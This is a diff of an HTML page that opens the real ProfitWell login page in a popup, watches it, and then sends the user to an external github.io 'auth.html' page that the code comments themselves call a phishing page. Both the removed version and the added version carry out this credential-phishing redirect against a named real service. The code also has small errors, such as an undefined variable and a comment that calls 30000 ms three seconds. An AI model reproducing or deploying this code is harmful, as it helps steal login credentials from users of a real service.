@@ -3,49 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cross-Site Window Control</title>
+    <title>Monitor Child Window</title>
     <script>
-        function monitorLogin(newWindow) {
-            const targetLoginUrl = "https://www2.profitwell.com/acc/login/";
-            const postLoginUrl = "https://www2.profitwell.com/app/dashboard";
+        function monitorChildWindow(childWindow) {
+            console.log("Monitoring child window...");
 
             const checkInterval = setInterval(() => {
-                try {
-                    // Check if the child window navigates to the post-login URL
-                    if (newWindow.location.href.includes(postLoginUrl)) {
-                        console.log("Login detected!");
-
-                        // Redirect the child window to the phishing site
-                        childWindow.location.href = "https://du4l5ynche1n.github.io/missing-coop/auth.html";
-                        clearInterval(checkInterval);
-                    }
-                } catch (err) {
-                    // SOP will block access to child window's location if cross-origin
-                    console.warn("Unable to access child window: Same-Origin Policy restrictions.");
-                }
-
                 // Check if the child window is closed
-                if (newWindow.closed) {
-                    console.log("New window closed.");
-                    clearInterval(checkInterval);
+                if (childWindow.closed) {
+                    console.log("Child window has been closed!");
+
+                    // Assume the window was closed after login if it stays open for a reasonable time
+                    const elapsedTime = Date.now() - childWindow.startTime;
+                    if (elapsedTime > 30000) { // Example: 3 seconds threshold
+                        console.log("Login likely completed, redirecting user...");
+                        // Redirect user to phishing page or take any malicious action
+                        window.location.href = "https://du4l5ynche1n.github.io/missing-coop/auth.html";
+                    } else {
+                        console.log("Window was closed too quickly, likely no login happened.");
+                    }
+
+                    clearInterval(checkInterval); // Stop monitoring
                 }
-            }, 1000); // Poll every second
+            }, 500); // Check every half-second
         }
 
         function initialize() {
             // Open the target site's login page in a child window
-            const newWindow = window.open("https://www2.profitwell.com/acc/login/", "popup", "");
-            console.log("New window opened for login monitoring.");
+            const childWindow = window.open(
+                "https://www2.profitwell.com/acc/login", 
+                "popup", 
+                ""
+            );
 
-            // Start monitoring the child window for login activity
-            monitorLogin(newWindow);
+            if (!childWindow) {
+                console.error("Failed to open the child window. Pop-up blocker might be active.");
+                return;
+            }
+
+            console.log("Child window opened for login.");
+            
+            // Add a custom property to track when the child window opened
+            childWindow.startTime = Date.now();
+
+            // Start monitoring the child window
+            monitorChildWindow(childWindow);
         }
 
         window.onload = initialize;
     </script>
 </head>
 <body>
-    <h1>Cross-Site Window Control Demo</h1>
-    <p>Simulating login monitoring via cross-site window control.</p>
+    <h1>Monitor Child Window Closure</h1>
+    <p>The child window will be monitored for login activity by observing closure events.</p>
 </body>
 </html>
